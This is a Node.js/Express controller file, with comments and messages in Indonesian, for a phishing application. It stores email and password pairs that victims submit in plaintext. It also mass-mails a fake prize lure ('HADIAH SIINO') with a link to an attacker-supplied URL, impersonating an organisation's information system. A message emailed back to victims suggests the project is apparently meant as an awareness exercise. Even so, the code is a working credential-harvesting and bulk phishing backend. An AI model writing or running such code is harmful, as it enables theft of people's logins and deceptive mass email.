const PhisingData = require("../models/phising.model");
const nodemailer = require("nodemailer");
const { email_config } = require("../config");

// Mendapatkan Semua Phising
exports.getAllPhising = async (req, res) => {
  PhisingData.find().exec((err, data) => {
    if (!err) {
      res.status(200).json({
        message: "Berhasil Mendapatkan Semua Hasil Phising,",
        data,
      });
    } else {
      res.status(400).send("Gagal Mendapatkan Semua Face, ERR : " + err);
    }
  });
};

// Mendapatkan Semua Phising
exports.savePhising = async (req, res) => {
  try {
    const { usa_email, usa_pswd } = req.body;
    const data = new PhisingData({
      usa_email,
      usa_pswd,
    });
    const check = await PhisingData.findOne({ usa_email });
    await data.save().then(() => {
      if (!check) {
        const email_payload = {
          from: "'ANGSA CYBER CUSTODIAN' mintanomorwhatsappnya@gmail.com", // sender address
          to: data?.usa_email, // list of receivers
          subject: "Phising By ANGSA CYBER CUSTODIAN", // Subject line
          html: `
          <b>Selamat Anda Terkena Phising !!! Jangan percaya sama penipuan model begini</b>
          <br/>
          <b>EMAIL : ${data.usa_email}</b>
          <br/>
          <b>PASSWORD : ${data.usa_pswd}</b>`, // html body
        };
        sendMail(email_payload);
      }
      res.status(200).json({
        data,
        message: `Phising Berhasil Disimpan`,
      });
    });
  } catch (error) {
    res.status(400).send("Gagal Menyimpan Data, ERR : " + error);
  }
};

exports.sendMassMail = async (req, res) => {
  try {
    const { list_email, url } = req.body;
    const email_payload = {
      from: "'SIINO - SISTEM INFORMASI DAN ORGANISASI' mintanomorwhatsappnya@gmail.com", // sender address
      to: list_email, // list of receivers
      subject: "HADIAH SIINO", // Subject line
      html: `
      <p>Selamat anda mendapatkan hadiah dari SIINO </p>
      <b>Senilai $1,000,000 Zimbawe</b>
      <p>Silahkan <b><a href="${url}" target="_blank" data-saferedirecturl="https://www.google.com/url?q=${url}&amp;source=gmail">AMBIL HADIAH</a></b><p/>`, // html body
    };
    const send = await sendMail(email_payload);
    if (send?.messageId) {
      res.status(200).json({
        message: `Phising Berhasil Disebar ${send?.messageId}`,
      });
    }
  } catch (error) {
    res.status(400).send("Gagal Mengirim Email Massal, ERR : " + error);
  }
};

const sendMail = async (payload) => {
  try {
    // create reusable transporter object using the default SMTP transport
    let transporter = nodemailer.createTransport({
      service: "gmail",
      auth: email_config,
    });

    // send mail with defined transport object
    let info = await transporter.sendMail(payload);

    console.log("Message sent: %s", info);
    return info;
    // Message sent: <b658f8ca-6296-ccf4-8306-87d57a0b4321@example.com>
  } catch (error) {
    return error;
  }
};
